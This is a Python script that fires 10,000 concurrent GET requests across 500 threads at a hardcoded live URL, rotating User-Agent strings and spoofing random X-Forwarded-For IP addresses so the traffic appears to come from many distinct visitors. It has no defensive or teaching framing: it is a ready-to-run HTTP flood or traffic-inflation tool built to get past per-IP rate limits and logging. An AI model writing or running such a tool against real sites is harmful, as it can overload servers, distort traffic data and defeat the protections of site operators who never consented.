import requests
import random
from concurrent.futures import ThreadPoolExecutor
import threading
from faker import Faker

# Shared counter variable for successful requests
success_counter = 0
counter_lock = threading.Lock()

# Function to send HTTP request with a random User-Agent and IP
def send_request(url):
    global success_counter
    
    try:
        # Generate a fake IP address
        fake = Faker()
        ip_address = fake.ipv4()
        
        # Define a list of User-Agent strings
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
          "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
          "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
          "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
          "SamsungBrowser/17.0 (Galaxy S23 Ultra; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
        ]
        
        # Choose a random User-Agent from the list
        user_agent = random.choice(user_agents)
        
        # Set the User-Agent and IP headers
        headers = {"User-Agent": user_agent, "X-Forwarded-For": ip_address}
        
        # Send GET request with the specified User-Agent and IP
        response = requests.get(url, headers=headers)
        
        # Check if the request was successful (status code 200)
        if response.status_code == 200:
            with counter_lock:
                success_counter += 1
            print(f"Request to {url} with User-Agent {user_agent} and IP {ip_address} successful")
            # Process response data if needed
        else:
            print(f"Request to {url} with User-Agent {user_agent} and IP {ip_address} failed with status code: {response.status_code}")
            
    except requests.exceptions.RequestException as e:
        print(f"An error occurred while sending request to {url}: {e}")

def main():
    # Define the URL
    url = 'http://hacking122.rf.gd/'
    
    # Number of times to send the request
    num_requests = 10000
    
    # Maximum number of workers
    max_workers = 500
    
    # Create a ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Submit requests
        for _ in range(num_requests):
            executor.submit(send_request, url)
    
    # Print the total number of successful requests
    print(f"Total successful requests: {success_counter}")

if __name__ == "__main__":
    main()
